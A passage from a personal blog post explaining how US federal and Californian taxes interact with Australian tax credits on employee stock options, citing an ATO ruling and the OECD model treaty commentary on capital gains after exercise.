to file a Californian return that year.</p>

<h3 id="gotchas">🔎Gotchas</h3>
<p>Note that there’s a big gotcha in the worked example above: you only got to
claim tax credits in Australia for the 83% income that the US taxed federally,
but not for the 36% that California taxed.</p>

<p>That’s because, as previously mentioned, the tax treaties only operate between
pairs of countries, not between one country and a state in the other. This
means it’s quite possible that you won’t be able to get tax credits for taxes
paid to a state of another country, and will end up double taxed on part of your
income.</p>

<p>For the worked example, Australia specifically
<a href="https://www.ato.gov.au/law/view/pdf/pbr/it2507.pdf">does consider Californian taxes to be a part of the US income tax system</a>,
so you would in actuality be allowed to claim credits for taxes paid there,
though the same isn’t true in all other countries.</p>

<h3 id="investments">📈Investments</h3>
<p>You might wonder what happens when you eventually sell the shares you get as
a result of exercising – will those also be subject to US or Californian
taxes? While I don’t have personal experience with this situation, the OECD
tax treaty commentary clarifies this point in
(<a href="https://read.oecd-ilibrary.org/taxation/model-tax-convention-on-income-and-on-capital-condensed-version-2017_mtc_cond-2017-en#page326">Article 15, 12.2</a>):
only the income effectively connected to your employment is taxable in the
source jurisdiction. Since exercising is considered to be an investment
decision, any increase in value of the share resulting from the exercise of an
option is considered to be a capital gain, and is therefore <em>not</em> taxable by the
source jurisdiction. Helpfully, this is also California’s interpretation, giving
us some much-needed consistency between what happens internationally and within
California.</p>

<p>If instead you had chosen to exercise prior to moving, the OECD commentary
states that when you moved the asset would be treated as being capital in
nature, and so would only be taxable in your jurisdiction of residence at sale.
However, several countries, including the US …</p></div></section></article></div></section></section></div>
